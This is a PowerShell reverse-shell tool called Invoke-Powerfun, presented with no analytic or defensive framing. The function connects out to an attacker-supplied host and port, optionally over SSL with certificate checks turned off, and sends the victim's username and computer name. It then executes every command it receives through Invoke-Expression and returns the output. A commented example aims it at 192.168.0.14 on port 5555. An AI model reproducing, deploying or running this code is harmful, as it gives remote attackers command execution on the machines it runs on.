        # Powerfun - Written by Ben Turner & Dave Hardy
        function Invoke-Powerfun 
        { 
            Param( 
                [String]$listen,
                [String]$port,
                [String]$Command,
                [String]$Sslcon
            ) 
            Process { 
                if ($Command -eq 'reverse')
                {
                    $client = New-Object System.Net.Sockets.TCPClient($listen,$port)
                }

                $stream = $client.GetStream()

                if ($Sslcon -eq 'true') 
                {
                    $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
                    $sslStream.AuthenticateAsClient($listen) 
                    $stream = $sslStream 
                }

                [byte[]]$bytes = 0..255|%{0}
                $sendbytes = ([text.encoding]::ASCII).GetBytes('Windows PowerShell running as user ' + $env:username + ' on ' + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
                $stream.Write($sendbytes,0,$sendbytes.Length)


                $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
                $stream.Write($sendbytes,0,$sendbytes.Length)

                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
                {
                    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                    $data = $EncodedText.GetString($bytes,0, $i)
                    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

                    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                    $x = ($error[0] | Out-String)
                    $error.clear()
                    $sendback2 = $sendback2 + $x

                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                    $stream.Write($sendbyte,0,$sendbyte.Length)
                    $stream.Flush()  
                }
                $client.Close()
                $listener.Stop()
            }
        }
        #Invoke-Powerfun -listen $listen -port $port -Command $Command -Sslcon $Sslcon
        #Example - Invoke-Powerfun -listen 192.168.0.14 -port 5555 -Command reverse -Sslcon False
